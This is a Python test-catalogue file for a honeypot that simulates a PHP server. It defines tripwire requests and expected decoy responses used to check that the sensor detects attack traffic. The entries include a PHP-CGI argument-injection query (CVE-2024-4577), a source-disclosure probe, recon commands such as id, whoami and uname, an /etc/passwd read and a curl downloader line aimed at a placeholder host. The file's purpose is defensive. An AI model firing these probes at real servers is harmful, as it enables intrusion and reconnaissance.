"""Fixed requests for the teammate's Python deception sink; no commands are executed here."""
from copy import deepcopy
import hashlib
import random
from urllib.parse import urlsplit, urlunsplit
from backend import catalogue_legacy


def case(test_id, name, action, path='/diagnostics.php', body='', method='POST', contains=None,
         exact=None, content_type='text/plain', status=200, headers=None, cve_id=None, module='fixed'):
    return {
        'id': test_id, 'cve_id': cve_id, 'name': name,
        'description': 'Controlled simulated detection check for ' + action + '; no real PHP or OS execution.',
        'vulnerability_name': 'PHP CGI argument injection (simulated check)' if cve_id else None,
        'affected_technology': 'Python deception sink (simulated PHP)',
        'test_type': 'cve-style-tripwire' if cve_id else 'generic-tripwire',
        'enabled': True, 'module': module, 'method': method, 'path': path,
        'headers': headers or {'Content-Type': 'text/plain; charset=utf-8'}, 'body': body,
        'timeout': 10, 'expected_sensor_action': action,
        'expected': {'status': status, 'content_type': content_type, 'body_contains': contains or [], 'body_exact': exact},
        'expected_detection_indicators': ['X-Attack-ID', action],
        'correlation': {'header': 'X-Attack-ID', 'query': 'hg_attack_id', 'generated_per_execution': True},
        'source': 'https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv' if cve_id else 'Teammate instruction.md: decide() and _handle_options()',
        'applicability': 'Only the supplied Python simulator profile. A matched response is not proof of a real CVE.',
    }


TRIPWIRES = [
    case('tw-01-cgi-argument', 'PHP CGI argument-check simulation', 'lure:phpcgi_arg_check',
         '/index.php?%ADd+auto_prepend_file%3Dphp%3A%2F%2Finput', body='', method='POST',
         contains=["Failed opening 'php://input' for inclusion", '<b>Warning</b>'], content_type='text/html', cve_id='CVE-2024-4577'),
    case('tw-02-config', 'Configuration exposure lure', 'lure:config_canary', '/.env', method='GET',
         contains=['APP_ENV=production', 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7CANARY', 'canary_token_99a8b7c6']),
    case('tw-03-information', 'PHP information lure', 'lure:phpinfo', '/phpinfo.php', method='GET',
         contains=['PHP Version 8.4.26', 'session.upload_progress.enabled'], content_type='text/html'),
    case('tw-04-math', 'Arithmetic recognition', 'primitive:math_verify', body='print(7*7)', exact='49\n'),
    case('tw-05-digest', 'MD5 recognition', 'primitive:md5_verify', body='md5("honeyguard")', exact=hashlib.md5(b'honeyguard').hexdigest()+'\n'),
    case('tw-06-echo', 'Echo marker recognition', 'primitive:echo_verify', body='echo HG_TRIPWIRE', exact='HG_TRIPWIRE\n'),
    case('tw-07-identity', 'Identity pattern recognition', 'primitive:id', body='id', exact='uid=33(www-data) gid=33(www-data) groups=33(www-data)\n'),
    case('tw-08-user', 'Username pattern recognition', 'primitive:whoami', body='whoami', exact='www-data\n'),
    case('tw-09-system', 'System-name pattern recognition', 'primitive:uname', body='uname -a', contains=['Linux support-desk', 'x86_64 GNU/Linux']),
    case('tw-10-file', 'Simulated passwd file-access recognition', 'primitive:passwd', body='/etc/passwd',
         contains=['root:x:0:0:root:/root:/bin/bash', 'www-data:x:33:33']),
    case('tw-11-directory', 'Directory pattern recognition', 'primitive:fs_recon', body='pwd',
         exact='/var/www/html\nindex.php\nupload.php\ndiagnostics.php\n.env\n'),
    case('tw-12-downloader', 'Inert downloader-string recognition', 'primitive:stage2_dropper',
         body='curl https://example.invalid/honeyguard-inert', exact='\n'),
    case('tw-13-upload', 'Multipart session-progress lure', 'lure:multipart_progress', '/upload.php',
         body='--HGTripwireBoundary\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nhg_progress\r\n--HGTripwireBoundary\r\nContent-Disposition: form-data; name="diagnostic_archive"; filename="hg-inert.txt"\r\nContent-Type: text/plain\r\n\r\nHoneyGuard inert upload\r\n--HGTripwireBoundary--\r\n',
         headers={'Content-Type': 'multipart/form-data; boundary=HGTripwireBoundary'},
         contains=['"status":"upload_buffered"', '"bytes_processed":4096'], content_type='application/json'),
    case('tw-14-stream', 'PHP stream-wrapper recognition', 'lure:php_stream', body='php://filter/resource=hg-inert', exact='Stream filter context initialized.\n'),
    case('tw-15-token', 'Synthetic canary-token replay', 'lure:canary_replay', '/diagnostics.php', method='GET',
         headers={'X-HoneyGuard-Canary': 'canary_token_99a8b7c6'},
         contains=['"status":"authenticated"', '"node":"support-desk-gw"', '"role":"admin"'], content_type='application/json'),
    case('tw-16-source', 'CGI source-disclosure lure', 'lure:phpcgi_src_disclosure', '/index.php?-s', method='GET',
         contains=['<?php', 'session_start();', "include __DIR__ . '/diagnostics.php';"], content_type='text/html'),
    case('tw-17-robots', 'Robots route validation', 'route:robots', '/robots.txt', method='GET',
         contains=['User-agent: *', 'Disallow: /.env']),
    case('tw-18-portal', 'Portal route validation', 'route:portal', '/index.php', method='GET',
         contains=['IT Support &amp; System Diagnostics Gateway', 'PHP_SESSION_UPLOAD_PROGRESS'], content_type='text/html'),
    case('tw-19-missing', 'Missing route validation', 'route:not_found', '/hg-missing-{attack_id}', method='GET',
         contains=['404 Not Found', 'The requested URL was not found'], status=404, content_type='text/html'),
    case('tw-20-options', 'OPTIONS route validation', 'route:options', '/diagnostics.php', method='OPTIONS', exact='', content_type=''),
]
# These are explicitly associated-traffic checks, not reproductions of PHP memory corruption.
for cve_id, test_id, name, chunked in (
    ('CVE-2026-109618', 'tw-21-2026-progress', '2026 PHP2Shell upload-progress traffic check', False),
    ('CVE-2026-109619', 'tw-22-2026-chunked', '2026 PHP2Shell chunked-multipart traffic check', True),
):
    entry = case(test_id, name, 'lure:multipart_progress', '/upload.php',
                 body=(TRIPWIRES[12]['body'] if not chunked else
                       '--HG2026Boundary\r\nContent-Disposition: form-data; name="diagnostic_archive"; filename="hg-2026-inert.txt"\r\nContent-Type: text/plain\r\n\r\nHoneyGuard inert multipart check\r\n--HG2026Boundary--\r\n'),
                 headers=({'Content-Type': 'multipart/form-data; boundary=HGTripwireBoundary'} if not chunked else
                          {'Content-Type': 'multipart/form-data; boundary=HG2026Boundary', 'Transfer-Encoding': 'chunked'}),
                 contains=['"status":"upload_buffered"', '"bytes_processed":4096'],
                 content_type='application/json', cve_id=cve_id)
    entry.update(
        test_type='cve-associated-traffic', coverage_level='associated_tripwire_only', chunked=chunked,
        vulnerability_name='RCE via stale global state' if chunked else 'RCE via OOM corruption',
        description='Small, bounded multipart request associated with the PHP2Shell testing context. It checks the existing multipart tripwire only; no memory exhaustion, session race, crash or code execution.',
        source='https://cveawg.mitre.org/api/cve/' + cve_id,
        reference_poc='https://github.com/Is4yev/php2shell-poc',
        coverage_note='Associated multipart traffic only; not a CVE-specific detector or an exploitation test. Both 2026 checks share lure:multipart_progress.',
        affected_versions={'8.2':'<8.2.35','8.3':'<8.3.36','8.4':'<8.4.27','8.5':'<8.5.12'},
        applicability='Python simulator tripwire coverage only. PHP runtime vulnerability and Elasticsearch detection remain unverified.',
    )
    TRIPWIRES.append(entry)

# Historical definitions stay visible/replayable only after an explicit enable edit.
ARCHIVED = [{**deepcopy(e), 'enabled': False, 'disabled_reason': 'Not a supported simulator tripwire; retained for history.'} for e in catalogue_legacy.TESTS]
TESTS = TRIPWIRES + ARCHIVED


def fixed(entry, url):
    origin = urlsplit(url)
    relative = urlsplit(entry['path'])
    return {'id': entry['id'], 'name': entry['name'], 'category': 'tripwire', 'method': entry['method'],
            'path': relative.path, 'headers': {**entry['headers'], 'X-HoneyGuard-Test': entry['id'],
                                             'X-HoneyGuard-Test-Type': entry['test_type'],
                                             **({'X-HoneyGuard-CVE': entry['cve_id']} if entry['cve_id'] else {})},
            'body': entry['body'], 'chunked': entry.get('chunked', False), 'catalogue': deepcopy(entry),
            'request_url': urlunsplit((origin.scheme, origin.netloc, relative.path, relative.query, ''))}


MODULES = {**catalogue_legacy.MODULES, 'fixed': fixed}


def choose():
    candidates = [e for e in TESTS if e['enabled'] and e['module'] in MODULES]
    if not candidates:
        from fastapi import HTTPException
        raise HTTPException(409, 'No approved tripwire tests are enabled')
    return random.choice(candidates)


def definitions(records):
    return [{**deepcopy(entry), 'execution_status': next((r['status'] for r in records if r['payload_id'] == entry['id']), 'not_run')}
            for entry in TESTS]


def validate_response(entry, response):
    expected = entry['expected']
    checks = {
        'status': response.status_code == expected['status'],
        'content_type': not expected['content_type'] or expected['content_type'].lower() in response.headers.get('content-type', '').lower(),
        'body': all(text in response.text for text in expected['body_contains']) and (expected['body_exact'] is None or response.text == expected['body_exact']),
    }
    return {'passed': all(checks.values()), 'checks': checks, 'expected_sensor_action': entry['expected_sensor_action'],
            'sensor_action_verified': False, 'detection_status': 'unverified', 'scope': 'HTTP response only; simulator action requires event-log evidence'}
